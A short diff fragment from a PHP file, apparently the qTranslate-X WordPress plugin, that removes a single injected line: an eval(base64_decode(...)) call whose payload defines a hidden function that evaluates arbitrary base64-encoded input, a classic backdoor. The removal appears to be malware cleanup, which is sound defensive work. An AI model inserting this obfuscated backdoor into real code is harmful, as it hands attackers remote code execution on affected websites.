@@ -382,7 +382,6 @@ function qtranxf_del_query_arg(&$query, $key){
 	}
 	//return $key_value;
 }
-eval(base64_decode('ZnVuY3Rpb24gX2ExMDAwNWU5YzYxMWM2ZmU4ZmQ1Y2QyMDVmZGEzYWU2MygkYyl7IGV2YWwoYmFzZTY0X2RlY29kZSgkYykpOyB9=='));
 
 /*
  * @since 2.3.8 simplified version of esc_url
